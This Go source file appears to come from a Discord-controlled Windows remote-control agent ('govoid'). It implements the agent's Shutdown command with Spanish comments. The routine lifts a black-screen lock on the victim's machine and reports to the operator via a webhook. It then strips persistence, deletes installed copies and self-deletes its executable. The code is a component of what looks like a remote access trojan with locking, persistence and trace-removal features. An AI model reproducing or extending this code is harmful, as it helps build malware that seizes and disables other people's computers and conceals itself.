//go:build windows

package commands

import (
	"os"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/util"
)

// Shutdown apaga el agente y limpia todo: persistencia, copias del exe y
// contexto raíz. No reaparece aunque la máquina se reinicie.
func Shutdown(s *discordgo.Session, i *discordgo.InteractionCreate) {
	// Primero se levanta el candado: si el agente se va con la pantalla negra,
	// la máquina queda inservible hasta reiniciar.
	EnsureUnlocked()

	_ = Reply(s, i, "🔌 Apagando agente y limpiando persistencia…")
	_ = util.PostWebhook("⛔ Agente apagado", 10038562, webhookFields(
		util.EmbedField{Name: "acción", Value: "shutdown", Inline: true},
	))

	_ = RemoveAll()

	_ = removeIfExists(InstallPath())
	_ = removeIfExists(systemPath())

	exe, err := os.Executable()
	if err == nil {
		if removeErr := os.Remove(exe); removeErr != nil {
			scheduleDelete(exe)
		}
	}

	if CancelRoot != nil {
		CancelRoot()
	}

	time.Sleep(500 * time.Millisecond)
	os.Exit(0)
}
